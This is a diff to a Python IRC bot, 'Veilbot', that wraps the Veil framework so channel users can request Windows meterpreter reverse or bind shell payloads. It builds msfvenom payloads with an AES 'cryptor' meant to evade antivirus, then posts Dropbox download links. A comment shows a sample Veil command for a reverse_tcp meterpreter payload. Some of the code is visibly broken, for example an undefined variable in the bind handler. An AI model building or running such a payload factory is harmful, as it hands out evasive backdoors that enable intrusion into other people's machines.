@@ -13,21 +13,26 @@ meterpreter backdoors.
 import os
 import sys
 import time
+import shutil
 import logging
 import sqlite3
 import ConfigParser
 
-from models import dbsession, create_tables, Share, DBFILE_NAME
+from models import dbsession, create_tables, \
+    User, Payload, DBFILE_NAME
 from argparse import ArgumentParser
 from twisted.application import internet
 from twisted.words.protocols import irc
 from twisted.internet import reactor, protocol
 
 # Veil imports
-from modules.common import controller
+from modules.common import controller as veil_controller
 from modules.common import messages
 from modules.common import supportfiles
 from config import veil
+
+### Constants
+DEFAULT_CONFIG = 'config/veilbot.cfg'
 
 
 ### Channel
@@ -54,6 +59,45 @@ class ChannelSettings(object):
     def __str__(self):
         return self.name
 
+
+class IRCArgumentParser(ArgumentParser):
+    
+    def error(self, message):
+        ''' Override default parser's error() '''
+        raise ValueError(message)
+
+
+# Reverse shell parser
+reverseShellParser = IRCArgumentParser()
+reverseShellParser.add_argument('--lhost',
+    dest='lhost',
+    required=True,
+)
+reverseShellParser.add_argument('--lport',
+    dest='lport',
+    default="4444",
+)
+reverseShellParser.add_argument('--protocol',
+    dest='protocol',
+    default="tcp",
+)
+reverseShellParser.add_argument('--cryptor',
+    dest='cryptor',
+    default='AESVirtualAlloc',
+)
+
+# Bind shell parser
+bindShellParser = IRCArgumentParser()
+bindShellParser.add_argument('--lport',
+    dest='lport',
+    default="4444",
+)
+bindShellParser.add_argument('--cryptor',
+    dest='cryptor',
+    default='AESVirtualAlloc',
+)
+
+
 ### Bot
 class Veilbot(irc.IRCClient):
     '''
@@ -69,7 +113,6 @@ class Veilbot(irc.IRCClient):
         'nickname': "veil",
         'realname': "Veilbot",
     }
-    bindShellParser = ArgumentParser()
 
     def initialize(self):
         ''' 
@@ -81,25 +124,12 @@ class Veilbot(irc.IRCClient):
             "!stfu": self.muteBot,
 
             # Actual commands
-            "!bind": self.addShare,
-            "!reverse": self.addShare,
+            "!bind": self.bind,
+            "!reverse": self.reverse,
             "!history": self.history,
         }
-        # Command parsers
-        reverseShellParser = argparse.ArgumentParser()
-        reverseShellParser.add_argument('--lhost', '-h',
-            dest='lhost'
-            required=True,
-        )
-        reverseShellParser.add_argument('--lport', '-p',
-            dest='lport',
-            default="4444",
-        )
-        bindShellParser = argparse.ArgumentParser()
-        bindShellParser.add_argument('--lport', '-p',
-            dest='lport',
-            default="4444",
-        )
+        self.protocols = ['tcp', 'tcp_rc4', 'http', 'https']
+        self.cryptors = ['AESVirtualAlloc']
 
     def __dbinit__(self):
         ''' Initializes the SQLite database '''
@@ -110,7 +140,7 @@ class Veilbot(irc.IRCClient):
             dbConn.close()
             create_tables()
 
-    def config(self, filename="config/veilbot.cfg"):
+    def config(self, filename=DEFAULT_CONFIG):
         ''' Load settings from config file '''
         logging.info('Loading config from: %s' % filename)
         config = ConfigParser.SafeConfigParser(self.defaults)
@@ -122,16 +152,7 @@ class Veilbot(irc.IRCClient):
     def __logging__(self, config):
         ''' Configure logging module '''
         logLevel = config.get("Logging", 'level')
-        if logLevel.lower() == 'debug':
-            logging.getLogger().setLevel(logging.DEBUG)
-        elif logLevel.lower().startswith('warn'):
-            logging.getLogger().setLevel(logging.WARNING)
-        elif logLevel.lower() == 'error':
-            logging.getLogger().setLevel(logging.ERROR)
-        elif logLevel.lower() == 'critical':
-            logging.getLogger().setLevel(logging.CRITICAL)
-        else:
-            logging.getLogger().setLevel(logging.INFO)
+        logging.getLogger().setLevel(logging.DEBUG)
 
     def __system__(self, config):
         ''' Configure system settings '''
@@ -139,6 +160,10 @@ class Veilbot(irc.IRCClient):
         logging.info('Config system bot nickname (%s)' % self.nickname)
         self.realname = config.get("System", 'realname')
         logging.info('Config system bot realname (%s)' % self.realname)
+        self.share_url = config.get("Dropbox", 'share_url')
+        self.share_lpath = config.get("Dropbox", 'share_lpath')
+        if self.share_lpath.endswith('/'):
+            self.share_lpath = self.share_lpath[:-1]
 
     def __channels__(self, filename):
         ''' Read channels to join from config file '''
@@ -153,7 +178,7 @@ class Veilbot(irc.IRCClient):
     def connectionLost(self, reason):
         ''' Auto-reconnect on dropped connections '''
         irc.IRCClient.connectionLost(self, reason)
-        logging.warn("Disconnected from server: %s" % str(reason))
+        logging.error("Disconnected from server: " + str(reason))
 
     def signedOn(self):
         ''' Called when bot has succesfully signed on to server '''
@@ -194,8 +219,9 @@ class Veilbot(irc.IRCClient):
         command = msg.split(" ")[0].lower()
         msg = ' '.join(msg.split(' ')[1:])
         if command in self.public_commands:
-            logging.debug("[Command]: <User: %s> <Channel: %s> <Msg: %s>" % (user, channel, msg))
-            self.public_commands[command](user, channel, msg)
+            dbuser = self.get_user(user)
+            logging.debug("[Command]: <User: %s> <Channel: %s> <Msg: %s>" % (dbuser, channel, msg))
+            self.public_commands[command](dbuser, channel, msg)
 
     def muteBot(self, user, channel, msg):
         ''' Toggle mute on/off '''
@@ -219,61 +245,129 @@ class Veilbot(irc.IRCClient):
             display_channel = channel
         self.msg(display_channel, message.encode('ascii', 'ignore'))
 
-    def userJoined(self, user, channel):
-        ''' New user joined the channel '''
-        if User.by_nick(nick) is None:
-            user = User(nick=user)
+    def get_user(self, nick):
+        user = User.by_nick(nick)
+        if user is None:
+            logging.info("Creating new user '%s'" % nick)
+            user = User(nick=nick)
             dbsession.add(user)
             dbsession.flush()
+        return user
+
+    def validate_ip_address(self, ip):
+        ip_address = filter(lambda char: char in '1234567890.', ip)
+        if 0 < len(ip_address) <= len("255.255.255.255"):
+            return ip_address
+        else:
+            return None
+
+    def validate_port(self, port):
+        ''' Validate we got a real port number '''
+        try:
+            return 1 < int(port) < 65535
+        except:
+            return False
 
     # Actual commands
     def bind(self, user, channel, msg):
         ''' Create a bind shell '''
-        pass
+        try:
+            args = bindShellParser.parse_args(msg.split())
+            # Check lport
+            if self.validate_port(args.lport):
+                msfoptions.append("LPORT=%s" % args.lport)
+            else:
+                raise ValueError("Invalid lport number")
+            fpath = self.__generate__(args)
+            #url = self.__dropbox__(fpath)
+            #self.display(user, channel, "Shell Download: %s" % (url,))
+        except ValueError as error:
+            self.display(user, channel, "Error: %s" % str(error))
 
     def reverse(self, user, channel, msg):
         ''' Create a reverse shell '''
-        args = reverseShellParser.parse_args(msg)
-        fpath = self.__generate__(args)
-        url = self.__dropbox__(fpath)
-        self.display(user, channel, "Shell Download: %s" % (url,))
-    
-    def __generate__(self, args): 
-        ''' Gerenate shell with args '''
-        controller = controller.Controller()
-        options = {}
-        if args.c:
-            options['required_options'] = {}
-            for option in args.c:
-                name,value = option.split("=")
-                options['required_options'][name] = [value, ""]
-        # pull out any msfvenom payloads/options
-        if args.msfpayload:
-            if args.msfoptions:
-                options['msfvenom'] = [args.msfpayload, args.msfoptions]
+        msfpayload = 'windows/meterpreter/reverse_'
+        msfoptions = []
+        try:
+            args = reverseShellParser.parse_args(msg.split())
+            # Check protocol
+            if args.protocol in self.protocols:
+                msfpayload += args.protocol
             else:
-                options['msfvenom'] = [args.msfpayload, None]
-        # manually set the payload
-        controller.SetPayload(args.l, args.p, options)
-        outName = controller.OutputMenu(
+                raise ValueError("Invalid protocol")
+            # Check lport
+            if self.validate_port(args.lport):
+                msfoptions.append("LPORT=%s" % args.lport)
+            else:
+                raise ValueError("Invalid lport number")
+            # Check lhost
+            ip_address = self.validate_ip_address(args.lhost)
+            if ip_address is not None:
+                msfoptions.append("LHOST=%s" % ip_address)
+            else:
+                raise ValueError("Invalid lhost ip address")
+            # Check cryptors
+            if args.cryptor in self.cryptors:
+                cryptor = args.cryptor
+            else:
+                raise ValueError("Invalid cryptor")
+            self.display(user, channel, "Generating payload, please wait ...")
+            # Flush buffers?
+            file_path = self.__generate__(msfpayload, msfoptions, cryptor)
+            print 'GOT:', file_path
+            url = self.__dropbox__(user, file_path)
+            self.display(user, channel, "Shell Download: %s" % (url,))
+        except ValueError as error:
+            self.display(user, channel, "Error: %s" % error)
+    
+#./Veil.py 
+# -l python 
+# -p AESVirtualAlloc 
+# -o foobar 
+# --msfpayload windows/meterpreter/reverse_tcp 
+# --msfoptions LHOST=192.168.1.1 LPORT=443
+
+    def __generate__(self, msfpayload, msfoptions, cryptor, language='python'): 
+        ''' Gerenate shell with args '''
+        logging.debug("msfpayload: %s" % msfpayload)
+        logging.debug("msfoptions: %s" % msfoptions)
+        logging.debug("cryptor: %s" % cryptor)
+        controller = veil_controller.Controller()
+        options = {}
+        options['msfvenom'] = [msfpayload, msfoptions]
+        controller.SetPayload(language, cryptor, options)
+        file_name = "irc_veil"
+        file_path = controller.OutputMenu(
             controller.payload, 
             controller.GeneratePayload(), 
             showTitle=False, 
             interactive=False, 
-            OutputBaseChoice=args.o
+            OutputBaseChoice=file_name,
         )
-        return outName
+        return file_path
 
-    def __dropbox__(self, fpath):
+    def __dropbox__(self, user, output):
         ''' Get public dropbox link '''
-        # Copy file to dropbox
-        return DROPBOX_URI + fname
+        file_name = os.path.basename(output)
+        extension = '/'+ user.uuid + '/'
+        dst_path = self.share_lpath + extension
+        if not os.path.exists(dst_path):
+            logging.debug("Mkdir: %s" % (dst_path))
+            os.mkdir(dst_path)
+        if os.path.exists(output):
+            logging.debug("Copy: %s -> %s" % (
+                output, dst_path + file_name
+            ))
+            shutil.copy(output, dst_path + file_name)
+        else:
+            raise ValueError("Failed to generate payload")
+        return self.share_url + extension + file_name
 
-    def history(self, nick, channel, msg):
+    def history(self, user, channel, msg):
         ''' Retrieve a user's history '''
         user = User.by_nick(user)
 
-    def help(self, nick, channel, msg):
+    def help(self, user, channel, msg):
         ''' Displays a helpful messages '''
         self.display(user, channel, " > Commands: Veilbot ")
         self.display(user, channel, "-------------------------------------")
@@ -293,7 +387,6 @@ class VeilbotFactory(protocol.ClientFactory):
         bot = Veilbot()
         bot.initialize()
         bot.config(self.configFilename)
-        logging.info("Veilbot IRC Bot Starting...")
         bot.factory = self
         return bot
 
@@ -313,4 +406,11 @@ if __name__ == '__main__':
         level=logging.INFO
     )
     factory = VeilbotFactory()
+    config = ConfigParser.SafeConfigParser({'port': '6667'})
+    config.readfp(open(DEFAULT_CONFIG, 'r'))
+    factory.configFilename = DEFAULT_CONFIG
+    server = config.get("Server", 'domain')
+    port = config.getint("Server", 'port')
+    reactor.connectTCP(server, port, factory)
+    logging.info("Starting reactor core ...")
     reactor.run()
